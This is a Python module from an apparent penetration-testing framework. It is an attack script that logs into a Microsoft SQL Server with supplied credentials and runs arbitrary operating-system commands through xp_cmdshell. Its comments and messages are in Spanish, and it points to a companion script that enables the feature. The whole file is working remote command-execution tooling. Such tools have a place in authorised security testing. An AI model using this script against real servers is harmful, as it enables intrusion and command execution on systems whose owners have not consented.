# scripts/mssql/attack/xp_cmdshell.py
from scripts.base import BaseScript
from modules.mssql import MSSQLModule
from core.output import print_result

class Script(BaseScript):
    name        = "xp-cmdshell"
    protocol    = "mssql"
    category    = "attack"
    description = "Ejecuta comandos OS via xp_cmdshell. Requiere sysadmin y xp_cmdshell habilitado."

    def run(self, **kwargs):
        command = kwargs.get("command", "whoami")
        port    = int(kwargs.get("port") or 1433)
        mod = MSSQLModule(self.target, self.creds)
        if not mod.connect(port=port):
            return None
        if not mod.login():
            mod.disconnect(); return None
        try:
            output = mod.xp_cmdshell(command)
            if output is None:
                print_result("MSSQL", self.target.ip, "fail",
                             "xp_cmdshell fallo - prueba primero xp-cmdshell-enable")
            return output
        finally:
            mod.disconnect()
